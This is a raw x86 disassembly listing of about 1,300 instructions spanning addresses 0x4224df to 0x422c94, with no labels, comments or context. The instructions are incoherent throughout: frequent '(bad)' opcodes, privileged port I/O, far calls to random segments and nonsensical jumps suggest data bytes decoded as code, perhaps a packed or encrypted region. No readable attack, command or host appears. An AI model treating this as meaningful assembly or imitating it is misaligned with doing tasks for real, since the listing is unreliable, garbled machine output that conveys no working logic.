  4224df:	mov    edx,0xc2940961
  4224e4:	jb     0x422534
  4224e6:	mov    DWORD PTR [edi-0x5e],edi
  4224e9:	push   edx
  4224ea:	mov    edx,0x50404276
  4224ef:	fst    QWORD PTR [eax-0x3fb5cc92]
  4224f5:	inc    edi
  4224f6:	ins    DWORD PTR es:[edi],dx
  4224f7:	add    eax,0x228f23a8
  4224fc:	fwait
  4224fd:	mov    al,0xfc
  4224ff:	test   eax,0x9662c504
  422504:	push   ebp
  422505:	ficom  WORD PTR [edx]
  422507:	cld    
  422508:	pop    eax
  422509:	pop    ss
  42250a:	xor    ah,BYTE PTR [ecx+0x62]
  42250d:	push   esi
  42250e:	nop
  42250f:	sub    al,0x2d
  422511:	cmp    eax,0x3141b41d
  422516:	mov    WORD PTR [eax+0x76],ds
  422519:	jns    0x422585
  42251b:	pop    ecx
  42251c:	cmp    esp,DWORD PTR [edi]
  42251e:	xor    cl,cl
  422520:	xlat   BYTE PTR ds:[ebx]
  422521:	inc    esp
  422522:	xchg   edi,eax
  422523:	fidiv  WORD PTR [edi]
  422525:	retf   
  422526:	fadd   DWORD PTR [esi]
  422528:	fwait
  422529:	ret    
  42252a:	add    dl,BYTE PTR [edi]
  42252c:	or     edx,edx
  42252e:	out    dx,eax
  42252f:	dec    ecx
  422530:	mov    cl,0xb
  422532:	xchg   ebx,eax
  422533:	add    al,0x24
  422535:	(bad)  
  422536:	fistp  QWORD PTR [ebp-0x35046956]
  42253c:	jecxz  0x42251b
  42253e:	fnstsw WORD PTR [eax+0x4a54e61a]
  422544:	mov    edi,0x563407b4
  422549:	outs   dx,DWORD PTR ds:[esi]
  42254a:	jns    0x42254e
  42254c:	scas   al,BYTE PTR es:[edi]
  42254d:	push   edx
  42254e:	hlt    
  42254f:	and    eax,0x15902097
  422554:	fcomp  DWORD PTR [esp+eax*4+0x71]
  422558:	add    eax,0xf4069080
  42255d:	mov    edi,0xef0dddb
  422562:	mov    cl,BYTE PTR [ebx-0x74]
  422565:	and    DWORD PTR [esi],0xd7590fe8
  42256b:	test   eax,0xfdc81bb0
  422570:	xor    eax,0x5b45e4fd
  422575:	enter  0xd8d6,0x39
  422579:	pushf  
  42257a:	outs   dx,DWORD PTR ds:[esi]
  42257b:	les    esi,FWORD PTR [ecx]
  42257d:	(bad)  
  42257f:	stos   DWORD PTR es:[edi],eax
  422580:	push   edi
  422581:	add    eax,0xa294680e
  422586:	(bad)  
  422587:	xor    BYTE PTR [ebx+0x5eb5d760],bl
  42258d:	jl     0x42254b
  42258f:	sbb    BYTE PTR [esi+ebx*4+0x26],dl
  422593:	test   esi,0xa01e99fb
  422599:	fmul   QWORD PTR ds:0x109b964e
  42259f:	out    0x2b,al
  4225a1:	add    edi,ecx
  4225a3:	cmp    eax,0x1b7bde34
  4225a8:	repnz data16 ins BYTE PTR es:[edi],dx
  4225ab:	loop   0x4225c9
  4225ad:	mov    ebx,0x11677b90
  4225b2:	xchg   ebp,eax
  4225b3:	and    DWORD PTR [edi-0x53],edi
  4225b6:	or     DWORD PTR [edx+0x63],ecx
  4225b9:	sbb    al,0xfb
  4225bb:	mov    eax,ds:0xca9b33be
  4225c0:	mov    edx,0x9b7e7d08
  4225c5:	cwde   
  4225c6:	mov    al,0xea
  4225c9:	push   eax
  4225ca:	adc    cl,BYTE PTR [edx-0x47]
  4225cd:	mov    ecx,0x62086d8b
  4225d2:	enter  0x9b45,0xe1
  4225d6:	push   ebp
  4225d7:	inc    ecx
  4225d8:	(bad)  
  4225d9:	les    esp,FWORD PTR [ebp-0x3d02fb15]
  4225df:	(bad)  
  4225e1:	pop    ebp
  4225e2:	xor    BYTE PTR [edx-0x54],dl
  4225e5:	sub    al,0xfa
  4225e7:	push   edi
  4225e8:	mov    ds:0x62363a53,al
  4225ed:	push   es
  4225ee:	rcr    ebp,1
  4225f0:	(bad)  
  4225f1:	iret   
  4225f2:	lock aam 0x65
  4225f5:	les    eax,FWORD PTR [edx+0x66]
  4225f8:	mov    bh,0xf3
  4225fa:	leave  
  4225fb:	mov    DWORD PTR [esp+ecx*2+0x4c512d76],esp
  422602:	xchg   ecx,eax
  422603:	ins    BYTE PTR es:[edi],dx
  422604:	out    0x5e,al
  422606:	dec    eax
  422607:	xchg   BYTE PTR [ebx+ebp*1],dl
  42260a:	push   eax
  42260b:	call   0xe109:0x7f8f15ff
  422612:	jbe    0x4225e7
  422614:	shl    ch,0x1e
  422617:	jge    0x422674
  422619:	ficom  WORD PTR [edi-0xdf1f67]
  42261f:	dec    esp
  422620:	or     BYTE PTR [esi-0xf],cl
  422623:	lods   al,BYTE PTR ds:[esi]
  422624:	movups xmm2,XMMWORD PTR [eax]
  422627:	lds    esi,FWORD PTR [ebp-0x2c]
  42262a:	nop
  42262b:	adc    DWORD PTR [edi-0xabaaba],0xffffff9a
  422632:	pop    edi
  422633:	dec    edx
  422634:	outs   dx,BYTE PTR ds:[esi]
  422635:	in     al,0x81
  422637:	mov    bl,0x3d
  422639:	dec    esp
  42263a:	mov    eax,ds:0xd62a9b19
  42263f:	mov    edi,0x73229c48
  422644:	popf   
  422645:	push   eax
  422646:	pop    esi
  422647:	dec    edx
  422648:	in     al,dx
  422649:	sar    BYTE PTR [edx-0x76],1
  42264c:	and    eax,0x9bf850d9
  422651:	in     al,0x35
  422653:	scas   eax,DWORD PTR es:[edi]
  422654:	mov    ebp,DWORD PTR [eax-0x1fb8d750]
  42265a:	mov    ecx,0x578e0bf1
  42265f:	sub    al,0xdb
  422661:	aaa    
  422662:	push   es
  422663:	lods   eax,DWORD PTR ds:[esi]
  422664:	fwait
  422665:	or     bh,bl
  422667:	add    DWORD PTR [edi-0xa],ebp
  42266a:	into   
  42266b:	sub    BYTE PTR [eax],ah
  42266d:	(bad)  
  42266f:	jae    0x4226c2
  422671:	mov    gs,edi
  422673:	rol    DWORD PTR [ebp+0x5cd5e8d8],cl
  422679:	fisubr WORD PTR [edx-0x7a5fe8e9]
  42267f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422680:	cmp    al,BYTE PTR [esi]
  422682:	aaa    
  422683:	jmp    0x4226de
  422685:	mov    es,ebp
  422687:	pop    eax
  422688:	mov    ecx,0xbb723ffc
  42268d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42268e:	push   esi
  42268f:	add    edi,esi
  422691:	out    dx,eax
  422692:	(bad)  
  422693:	mov    edx,0x50987800
  422698:	inc    esi
  422699:	neg    BYTE PTR [ebx-0x5e]
  42269c:	mov    bh,0xac
  42269e:	scas   al,BYTE PTR es:[edi]
  42269f:	cmp    BYTE PTR [edx-0x22],bl
  4226a2:	xor    DWORD PTR [esi-0x14],esi
  4226a5:	imul   eax,ebp,0x73f69bad
  4226ab:	push   ebp
  4226ac:	ins    BYTE PTR es:[edi],dx
  4226ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226ae:	mov    ah,0x5c
  4226b0:	mov    ch,0x55
  4226b2:	dec    esp
  4226b3:	test   DWORD PTR [eax-0x168bef5c],ecx
  4226b9:	push   ebx
  4226ba:	push   eax
  4226bb:	and    eax,0xff90958a
  4226c0:	inc    ecx
  4226c1:	push   ecx
  4226c2:	xor    BYTE PTR [ebx],bh
  4226c4:	sahf   
  4226c5:	(bad)  
  4226c6:	fmul   QWORD PTR [ecx+0x4e]
  4226c9:	pop    es
  4226ca:	xor    al,0xc3
  4226cc:	(bad)  
  4226cd:	pop    esp
  4226ce:	(bad)  
  4226cf:	jmp    0x42266c
  4226d1:	inc    edi
  4226d2:	test   al,0xd5
  4226d4:	sbb    BYTE PTR [esi-0x41],dl
  4226d7:	int3   
  4226d8:	mov    edi,0x240970dd
  4226dd:	sar    bh,cl
  4226df:	jbe    0x4226d1
  4226e1:	mov    DWORD PTR cs:[edx],esp
  4226e4:	jno    0x4226e7
  4226e6:	nop
  4226e7:	xor    al,0xcc
  4226e9:	pop    edi
  4226ea:	sbb    cl,ah
  4226ec:	out    dx,eax
  4226ed:	hlt    
  4226ee:	mov    ds:0x83e89784,eax
  4226f3:	leave  
  4226f4:	mov    ah,0xdd
  4226f6:	call   0x61d47b19
  4226fb:	daa    
  4226fc:	mov    ss,eax
  4226fe:	nop
  4226ff:	cmp    esp,ebx
  422701:	retf   
  422702:	jb     0x422715
  422704:	lods   eax,DWORD PTR ds:[esi]
  422705:	jp     0x4226ca
  422707:	dec    ecx
  422708:	retf   
  422709:	aam    0x60
  42270b:	(bad)  
  42270c:	push   eax
  42270d:	cmp    dl,BYTE PTR [esp+ecx*4]
  422710:	fwait
  422711:	arpl   WORD PTR [edi-0x78],ax
  422714:	aad    0x5b
  422716:	jb     0x4226d1
  422718:	shl    cl,cl
  42271a:	lods   eax,DWORD PTR ds:[esi]
  42271b:	lahf   
  42271c:	xchg   esp,eax
  42271d:	in     al,0xdd
  42271f:	leave  
  422720:	xor    dl,BYTE PTR [ebx+0x2d9b9e73]
  422726:	push   ds
  422727:	push   ecx
  422728:	imul   ecx,DWORD PTR [ebx],0x18
  42272b:	outs   dx,BYTE PTR ds:[esi]
  42272c:	inc    edi
  42272d:	ficom  WORD PTR ds:0x64bf4980
  422733:	ss test al,al
  422736:	jbe    0x4226dc
  422738:	mov    bl,0x36
  42273a:	mov    bh,0xa4
  42273c:	fist   DWORD PTR ds:0x5f7de6e0
  422742:	adc    dh,dl
  422744:	icebp  
  422745:	(bad)  
  422746:	cdq    
  422747:	call   0xdf34:0x91263ea4
  42274e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42274f:	push   edi
  422750:	or     bl,dl
  422752:	push   0x4f7e8212
  422757:	adc    al,0xae
  422759:	sbb    al,0xb1
  42275b:	and    DWORD PTR [ebx],ebx
  42275d:	xchg   esp,eax
  42275e:	push   cs
  42275f:	mov    ah,0xb7
  422761:	sar    ecx,0xf2
  422764:	mov    ds:0x2995ec74,al
  422769:	nop
  42276a:	pusha  
  42276b:	add    edx,esi
  42276d:	lea    edi,[edx+0x4a]
  422770:	sub    ah,ch
  422772:	cmp    DWORD PTR [esi-0x1a],esi
  422775:	mov    ds:0xc59b2de0,eax
  42277a:	test   esp,edx
  42277c:	aaa    
  42277d:	xor    cl,BYTE PTR [esi+0x53e26730]
  422783:	xchg   ebx,eax
  422784:	loop   0x4227b1
  422786:	ds retf 0x78af
  42278a:	outs   dx,BYTE PTR ds:[esi]
  42278b:	mov    ds:0x235b9f9b,eax
  422790:	push   0x4a
  422792:	push   esi
  422793:	test   eax,0xc518dee0
  422798:	sahf   
  422799:	addr16 jae 0x422763
  42279c:	out    dx,al
  42279d:	pop    ebp
  42279e:	push   ds
  42279f:	push   eax
  4227a0:	in     eax,0xc4
  4227a2:	cmp    al,0xf2
  4227a4:	dec    ebx
  4227a5:	in     eax,dx
  4227a6:	ja     0x422774
  4227a8:	cld    
  4227a9:	or     al,0xd3
  4227ab:	mov    ?,WORD PTR [edx+0x31e5856]
  4227b1:	pushf  
  4227b2:	nop
  4227b3:	cmp    al,0x23
  4227b5:	ja     0x422825
  4227b7:	and    ebx,edi
  4227b9:	xchg   ebp,eax
  4227ba:	mov    DWORD PTR [ecx+0x13],edx
  4227bd:	inc    ebp
  4227be:	dec    edx
  4227bf:	sub    edx,0xc225030d
  4227c5:	daa    
  4227c6:	or     al,0xed
  4227c8:	fwait
  4227c9:	push   ecx
  4227ca:	repz retf 0xb406
  4227ce:	inc    edi
  4227cf:	adc    ebp,DWORD PTR [ebx+0x6b36b3dd]
  4227d5:	inc    eax
  4227d6:	(bad)  
  4227d8:	and    eax,0xae589733
  4227dd:	pop    es
  4227de:	and    al,BYTE PTR [edi-0x5]
  4227e1:	pop    ebx
  4227e2:	xchg   DWORD PTR [ecx+edx*2-0x22],edi
  4227e6:	sub    esi,DWORD PTR [edx]
  4227e8:	mov    eax,ebx
  4227ea:	bound  edx,QWORD PTR [edx+0x77904ad4]
  4227f0:	sub    DWORD PTR [esi-0x4b29e7bf],esp
  4227f6:	loopne 0x422841
  4227f8:	nop
  4227f9:	ins    DWORD PTR es:[edi],dx
  4227fa:	sbb    DWORD PTR [ebx+0x382c88e2],edi
  422800:	fsubrp st(7),st
  422803:	inc    edi
  422804:	jge    0x422801
  422806:	sub    al,0xf2
  422808:	jb     0x4227d0
  42280a:	retf   0xb691
  42280d:	adc    BYTE PTR [ebx-0x159be5e3],0xbc
  422814:	xchg   ebx,eax
  422815:	and    DWORD PTR [esi],edi
  422817:	pop    ebp
  422818:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422819:	or     ch,bh
  42281b:	mov    al,0x15
  42281d:	pop    esi
  42281e:	add    esi,DWORD PTR [eax+0x4a4c7d27]
  422824:	or     ebp,DWORD PTR [edx+ecx*2+0x6e1a714f]
  42282b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42282c:	fwait
  42282d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42282e:	bnd jmp 0x42288b
  422831:	(bad)  
  422832:	fld    QWORD PTR [edx-0x59ad21f3]
  422838:	sbb    ebx,DWORD PTR [esi+ecx*4-0x7e0afde6]
  42283f:	inc    esi
  422840:	mov    ecx,0x1ed225b3
  422845:	in     eax,dx
  422846:	mov    ?,WORD PTR [ebx-0x27]
  422849:	aad    0x6a
  42284b:	aas    
  42284c:	jmp    0x42282b
  42284e:	cwde   
  42284f:	hlt    
  422850:	imul   esp,DWORD PTR [edi+0x6d],0xffffffff
  422854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422855:	adc    al,0x90
  422857:	xchg   ebx,eax
  422858:	jns    0x4227e6
  42285a:	jnp    0x422800
  42285c:	mov    bh,0xa0
  42285e:	xor    eax,0x510d6150
  422863:	push   0x72977860
  422868:	scas   al,BYTE PTR es:[edi]
  422869:	mov    ebx,0x76eba6bd
  42286e:	imul   ecx,DWORD PTR [esi],0xb465ddfe
  422874:	mov    ds:0x2e390143,eax
  422879:	inc    edi
  42287a:	nop
  42287b:	and    BYTE PTR [eax+ebp*1],ch
  42287e:	ret    0x3e8c
  422881:	or     BYTE PTR [edx],ch
  422883:	dec    edx
  422884:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422885:	mov    eax,ss:0xfa72b732
  42288b:	cli    
  42288c:	fwait
  42288d:	add    eax,0x3fd6efbd
  422892:	add    eax,0x20de5c48
  422897:	popa   
  422898:	cmc    
  422899:	adc    eax,0x911c6e95
  42289e:	nop
  42289f:	int3   
  4228a0:	jl     0x42291d
  4228a2:	in     eax,0x9c
  4228a4:	shr    BYTE PTR ds:0x25d74a61,cl
  4228aa:	ds scas al,BYTE PTR es:[edi]
  4228ac:	pop    ds
  4228ad:	push   cs
  4228ae:	xor    ah,BYTE PTR [eax+0x2fa4469b]
  4228b4:	in     eax,dx
  4228b5:	add    cl,BYTE PTR [edi]
  4228b7:	sub    al,BYTE PTR [eax-0x22]
  4228ba:	imul   eax,ebp,0x4b
  4228bd:	aaa    
  4228be:	sbb    al,0xa7
  4228c0:	sbb    BYTE PTR [eax],al
  4228c2:	nop
  4228c3:	test   DWORD PTR [ecx-0x5700a0ba],edi
  4228c9:	cmove  edx,DWORD PTR [ecx+0x65]
  4228cd:	xchg   ecx,eax
  4228ce:	pop    ss
  4228cf:	sub    dl,BYTE PTR [ebx]
  4228d1:	outs   dx,BYTE PTR ds:[esi]
  4228d2:	jp     0x422905
  4228d4:	adc    al,0x5d
  4228d6:	nop
  4228d7:	icebp  
  4228d8:	sub    eax,0xbb44cd9d
  4228dd:	jne    0x422951
  4228df:	ret    0xdda8
  4228e2:	jo     0x422869
  4228e4:	push   edx
  4228e5:	inc    ebx
  4228e6:	inc    ebx
  4228e7:	pop    eax
  4228e8:	push   ss
  4228e9:	dec    eax
  4228ea:	nop
  4228eb:	repz pop ss
  4228ed:	into   
  4228ee:	test   al,0xf5
  4228f0:	addr16 mov ch,0xaf
  4228f3:	addr16 daa 
  4228f5:	(bad)  
  4228f6:	es pop esp
  4228f8:	stos   BYTE PTR es:[edi],al
  4228f9:	repz repz dec ecx
  4228fc:	xor    BYTE PTR [esi+0x36],0xb3
  422900:	dec    eax
  422901:	inc    esi
  422902:	nop
  422903:	std    
  422904:	stc    
  422905:	cmp    al,0xbc
  422907:	mov    esi,0x4a2de857
  42290c:	fsub   st,st(2)
  42290e:	xor    bh,bl
  422910:	inc    edi
  422911:	mov    ds:0xc09bdeec,al
  422916:	sahf   
  422917:	jl     0x422993
  422919:	daa    
  42291a:	add    DWORD PTR [esi+0x3b],0x6b4a714f
  422921:	mov    DWORD PTR ds:0xaf3a5923,edi
  422927:	cmp    eax,0x83db99a9
  42292c:	mov    esp,0xdf2979dd
  422931:	adc    bl,cl
  422933:	dec    edx
  422934:	and    al,0x10
  422936:	xor    al,0xa
  422938:	bound  esi,QWORD PTR [ebp+0x3e]
  42293b:	mov    edx,0xbe903aa0
  422940:	jmp    0x8aeb9c73
  422945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422946:	pop    edi
  422947:	cmp    ch,BYTE PTR [ebx-0x1f]
  42294a:	inc    esp
  42294b:	pushf  
  42294c:	ret    
  42294d:	and    ebx,DWORD PTR [edx]
  42294f:	cs xchg ebx,eax
  422951:	push   0x29
  422953:	jnp    0x4228e2
  422955:	mov    ds:0xbabbb890,al
  42295a:	push   edi
  42295b:	retf   0xebe5
  42295e:	rol    BYTE PTR [edx+0x139b91a8],cl
  422964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422965:	push   eax
  422966:	adc    BYTE PTR [esi],bh
  422968:	ja     0x422942
  42296a:	mov    ebp,0x4029bdb
  42296f:	sub    DWORD PTR [ecx-0x5d],edx
  422972:	ret    
  422973:	ss jmp 0xc566:0xf0e3d0dd
  42297b:	pop    edi
  42297c:	mov    dl,0x9a
  42297e:	(bad)  
  422980:	xchg   ecx,eax
  422981:	in     eax,0x85
  422983:	fbld   TBYTE PTR [ecx-0x169b8ec8]
  422989:	cmp    dh,al
  42298b:	cld    
  42298c:	cmc    
  42298d:	(bad)  [ecx+edi*2-0x7a2f8ea]
  422994:	cmp    al,0xf2
  422996:	(bad)
  42299a:	pop    edi
  42299b:	pop    ecx
  42299c:	inc    eax
  42299d:	(bad)  [ecx+0x4a]
  4229a0:	sub    eax,DWORD PTR [esi]
  4229a2:	cwde   
  4229a3:	dec    ch
  4229a5:	dec    ebx
  4229a6:	shl    DWORD PTR [eax],1
  4229a8:	fwait
  4229a9:	neg    DWORD PTR [eax]
  4229ab:	push   esp
  4229ac:	in     al,0x63
  4229ae:	mov    esp,0x6810f7ef
  4229b3:	push   ebx
  4229b4:	aas    
  4229b5:	pop    edi
  4229b6:	push   0x9082d37f
  4229bb:	test   eax,0xd8c0eca3
  4229c0:	lods   eax,DWORD PTR ds:[esi]
  4229c1:	or     eax,0x83b64a8d
  4229c6:	xchg   ebp,eax
  4229c7:	or     al,0xa
  4229c9:	xor    al,0x2e
  4229cb:	pusha  
  4229cc:	fwait
  4229cd:	mov    dh,0xfe
  4229cf:	pop    es
  4229d0:	or     al,0xf2
  4229d2:	sub    BYTE PTR [esp+eiz*2-0x64b89fca],ch
  4229d9:	call   0x9135b7b5
  4229de:	and    BYTE PTR [edi-0x65],cl
  4229e1:	cmp    ah,cl
  4229e3:	les    ecx,FWORD PTR [edi+0xf]
  4229e6:	pushf  
  4229e7:	push   edi
  4229e8:	ins    BYTE PTR es:[edi],dx
  4229e9:	fist   WORD PTR [esi+eiz*8]
  4229ec:	add    eax,0x44216361
  4229f1:	stos   BYTE PTR es:[edi],al
  4229f2:	ss dec esp
  4229f4:	mov    ecx,0xdbd45f2d
  4229f9:	(bad)  
  4229fa:	mov    edx,0x98c61ffb
  4229ff:	sub    eax,0x5e75ddec
  422a04:	or     BYTE PTR [ebx],bh
  422a06:	push   ds
  422a07:	cmp    al,0xd5
  422a09:	jp     0x422a18
  422a0b:	push   cs
  422a0c:	fdivr  st,st(5)
  422a0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a0f:	dec    ecx
  422a10:	push   ebx
  422a11:	mov    edx,0x4454ac1b
  422a16:	fst    QWORD PTR [eax-0x52]
  422a19:	imul   ebx,DWORD PTR [ebx-0x45],0x745c7e2f
  422a20:	ret    
  422a21:	mov    ebx,0x12b1a990
  422a26:	lahf   
  422a27:	mov    edx,edx
  422a29:	(bad)  
  422a2a:	mov    ds:0x65a03449,al
  422a2f:	jmp    0x4229e4
  422a31:	ins    BYTE PTR es:[edi],dx
  422a32:	cmp    DWORD PTR [ebp-0x426fb9e7],ebx
  422a38:	adc    ecx,DWORD PTR [esi+0x3f]
  422a3b:	in     al,0x54
  422a3d:	jl     0x422a90
  422a3f:	dec    edx
  422a40:	jg     0x422a4d
  422a42:	adc    dh,BYTE PTR [ecx+0x3a3e3eb7]
  422a48:	fwait
  422a49:	mov    cl,bh
  422a4b:	jae    0x4229d6
  422a4d:	das    
  422a4e:	in     al,0xc2
  422a50:	inc    esi
  422a51:	(bad)  
  422a53:	mov    cl,0xe3
  422a55:	adc    bh,cl
  422a57:	mov    bl,0xfd
  422a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a5a:	or     ebx,DWORD PTR [ebx]
  422a5c:	mov    ds:0x594665c3,al
  422a61:	rol    eax,cl
  422a63:	out    0xcb,eax
  422a65:	retf   0x4995
  422a68:	sbb    BYTE PTR [edi-0x4f916ef],cl
  422a6e:	fisttp DWORD PTR ds:0x78905193
  422a74:	test   al,0x2a
  422a76:	jne    0x422af5
  422a78:	cmc    
  422a79:	jmp    0x422a25
  422a7b:	dec    esp
  422a7c:	std    
  422a7d:	test   al,0xa0
  422a7f:	xor    eax,0xc7109359
  422a84:	je     0x422ae2
  422a86:	nop
  422a87:	mov    BYTE PTR [eax],dh
  422a89:	xor    dl,cl
  422a8b:	cmp    dh,BYTE PTR [edx+0x7d]
  422a8e:	test   eax,0x49ee7049
  422a93:	shl    DWORD PTR [edi+ebp*8+0x35],1
  422a97:	jecxz  0x422aad
  422a99:	or     dl,BYTE PTR [eax+0x43344601]
  422a9f:	bound  eax,QWORD PTR [esi]
  422aa1:	adc    eax,0x7df749f6
  422aa6:	push   ds
  422aa7:	or     eax,0x87609502
  422aac:	fwait
  422aad:	cmp    bl,al
  422aaf:	xchg   esi,eax
  422ab0:	mov    ebx,0x7827b340
  422ab5:	fiadd  WORD PTR [eax+0x7ee4d1ee]
  422abb:	pusha  
  422abc:	xchg   ecx,eax
  422abd:	add    dl,BYTE PTR [eax+0x2e9ee31e]
  422ac3:	push   edx
  422ac4:	popa   
  422ac5:	xor    al,0x46
  422ac7:	dec    edx
  422ac8:	leave  
  422ac9:	dec    edx
  422aca:	aaa    
  422acb:	push   eax
  422acc:	imul   esp,DWORD PTR [ecx+0x1b],0xffffffb0
  422ad0:	mov    cl,0x30
  422ad2:	inc    eax
  422ad3:	fidiv  WORD PTR [edi+0x1b236d7e]
  422ad9:	(bad)  
  422ada:	nop
  422adb:	push   esi
  422adc:	cs add al,0xa4
  422adf:	mov    esp,0x3bca5c16
  422ae4:	push   ebp
  422ae5:	faddp  st(3),st
  422ae7:	out    0x78,eax
  422ae9:	mov    WORD PTR [edx+edi*4-0x3a6f8a61],gs
  422af0:	outs   dx,BYTE PTR ds:[esi]
  422af1:	repnz out 0xe,eax
  422af4:	xchg   ebx,eax
  422af5:	sbb    BYTE PTR [ebx+0x58],al
  422af8:	pop    esi
  422af9:	lds    edi,FWORD PTR [eax+0x4]
  422afc:	or     esp,ebx
  422afe:	repz test DWORD PTR [ebp-0x35ddffe],esp
  422b05:	xchg   ebp,eax
  422b06:	nop
  422b07:	ds xchg ebx,eax
  422b09:	sub    ch,bl
  422b0b:	sub    eax,0x4a73714f
  422b10:	mov    DWORD PTR [esi],edi
  422b12:	(bad)  
  422b13:	sub    al,BYTE PTR [edx-0x63b93a80]
  422b19:	hlt    
  422b1a:	xlat   BYTE PTR ds:[ebx]
  422b1b:	xor    DWORD PTR [ecx-0x1f],ebp
  422b1e:	push   ebx
  422b1f:	inc    edx
  422b20:	outs   dx,DWORD PTR ds:[esi]
  422b21:	fst    QWORD PTR [edx+0x17340d88]
  422b27:	mov    edi,0x2a81772a
  422b2c:	sbb    cl,BYTE PTR [esi+0x6487adaa]
  422b32:	lods   eax,DWORD PTR ds:[esi]
  422b33:	push   esp
  422b34:	push   eax
  422b35:	mov    ah,0x50
  422b37:	sbb    cl,bh
  422b39:	test   eax,edx
  422b3b:	mov    eax,0x8f9bde28
  422b40:	in     eax,dx
  422b41:	enter  0xe32c,0x81
  422b45:	retf   0x4382
  422b48:	sbb    DWORD PTR [ebp+0x60a54890],ebx
  422b4e:	or     ecx,ecx
  422b50:	sub    al,0x17
  422b52:	shr    DWORD PTR [edi],1
  422b54:	(bad)  
  422b56:	jns    0x422af8
  422b58:	adc    eax,0x3c8fe21a
  422b5d:	cld    
  422b5e:	sahf   
  422b5f:	pop    es
  422b60:	pop    edx
  422b61:	test   DWORD PTR [ecx+0x4a],eax
  422b64:	mov    dl,0xa3
  422b66:	fsubr  st(5),st
  422b68:	cmp    ch,dl
  422b6a:	add    BYTE PTR [ebp-0x6c],bl
  422b6d:	lea    esp,[eax+esi*2+0x30709c9e]
  422b74:	aad    0x55
  422b76:	sar    DWORD PTR [ecx],1
  422b78:	jmp    0x238beff2
  422b7d:	outs   dx,BYTE PTR ds:[esi]
  422b7e:	and    edi,ebx
  422b80:	and    ah,BYTE PTR [edx-0x21]
  422b83:	fisttp WORD PTR [esi]
  422b85:	test   eax,0x4e74c390
  422b8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b8b:	cmc    
  422b8c:	xor    ecx,DWORD PTR [ebx]
  422b8e:	mov    bl,0x4d
  422b90:	dec    ebx
  422b91:	ficomp DWORD PTR [edi-0x17a17bbe]
  422b97:	out    dx,al
  422b98:	mov    al,ds:0x1a19028
  422b9d:	(bad)  
  422b9e:	das    
  422b9f:	cmp    esp,DWORD PTR [edx+0x534a6a77]
  422ba5:	cli    
  422ba6:	pop    es
  422ba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ba8:	lock sub ah,BYTE PTR ds:0x79fd9b57
  422baf:	cmp    BYTE PTR cs:[esi],dl
  422bb2:	dec    ebp
  422bb3:	jo     0x422bdd
  422bb5:	es ret 0x9ba4
  422bb9:	ins    BYTE PTR es:[edi],dx
  422bba:	data16 (bad) 
  422bbc:	cmp    DWORD PTR [eax+0x73],eax
  422bbf:	xor    ebx,DWORD PTR [ebx+0xd1bface]
  422bc5:	mov    ebp,0xe4ef4527
  422bca:	mov    dl,0x6
  422bcc:	shl    BYTE PTR [ebx],cl
  422bce:	stos   DWORD PTR es:[edi],eax
  422bcf:	sbb    DWORD PTR [eax-0x2b8c8c62],edx
  422bd5:	sub    edx,esi
  422bd7:	dec    edi
  422bd8:	push   esi
  422bd9:	add    esp,DWORD PTR [edi]
  422bdb:	mov    WORD PTR [ecx],?
  422bdd:	icebp  
  422bde:	ror    BYTE PTR [esi+0x5],cl
  422be1:	fsubrp st(3),st
  422be3:	into   
  422be4:	mov    eax,DWORD PTR ds:0x349b7868
  422bea:	mov    eax,0x8eca9265
  422bef:	cmp    eax,0x5c45e1df
  422bf4:	mov    bl,cl
  422bf6:	outs   dx,BYTE PTR ds:[esi]
  422bf7:	retf   0xb52c
  422bfa:	inc    ebp
  422bfb:	hlt    
  422bfc:	fwait
  422bfd:	and    edi,edi
  422bff:	in     eax,dx
  422c00:	mov    ds:0xc303bdff,al
  422c05:	ficom  WORD PTR [ebx+0x4c]
  422c08:	inc    ebx
  422c09:	sub    eax,0xd646d9e5
  422c0e:	or     bl,BYTE PTR [eax+0x3444599b]
  422c14:	das    
  422c15:	adc    eax,0xe1730dba
  422c1a:	fidivr DWORD PTR [edx+eax*4]
  422c1d:	add    al,0x6f
  422c1f:	xor    eax,DWORD PTR [ebx+0x2]
  422c22:	and    ebp,DWORD PTR [ecx+ebx*4-0x626c6fe6]
  422c29:	cmp    esp,ebp
  422c2b:	cmp    dh,ah
  422c2d:	add    bh,ch
  422c2f:	or     DWORD PTR [bp-0x7e],eax
  422c33:	or     dh,BYTE PTR [edi-0x1424bb0c]
  422c39:	aam    0x90
  422c3b:	sub    ebp,DWORD PTR [ecx+edx*8-0x72]
  422c3f:	fdiv   DWORD PTR [eax+ecx*2-0x11]
  422c43:	dec    ecx
  422c44:	test   DWORD PTR [edx],ebx
  422c46:	mov    ch,BYTE PTR [eax-0x75fda697]
  422c4c:	fwait
  422c4d:	out    dx,al
  422c4e:	adc    ebx,edx
  422c50:	inc    ebp
  422c51:	jl     0x422c4b
  422c53:	nop
  422c54:	sub    al,0xdf
  422c56:	pushaw 
  422c58:	retf   
  422c59:	mov    bl,0xf7
  422c5b:	inc    esi
  422c5c:	pop    ebp
  422c5d:	stos   BYTE PTR es:[edi],al
  422c5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c5f:	test   DWORD PTR [ebx-0x42790bc6],ebx
  422c65:	popa   
  422c66:	(bad)  
  422c67:	mov    esi,0x7906192a
  422c6c:	sbb    eax,edi
  422c6e:	sub    edi,DWORD PTR [eax-0x7e5f024f]
  422c74:	fdiv   DWORD PTR [ebx-0x64]
  422c77:	out    0xb7,al
  422c79:	inc    edi
  422c7a:	push   eax
  422c7b:	adc    ebp,0xe322716d
  422c81:	sbb    BYTE PTR [esi-0x513864df],cl
  422c87:	jl     0x422ca4
  422c89:	or     dl,BYTE PTR [esi-0x13cf647c]
  422c8f:	mov    dl,0x11
  422c91:	xchg   ebx,eax
  422c92:	dec    ecx
  422c93:	pushf  
  422c94:	mov    bh,0xe0
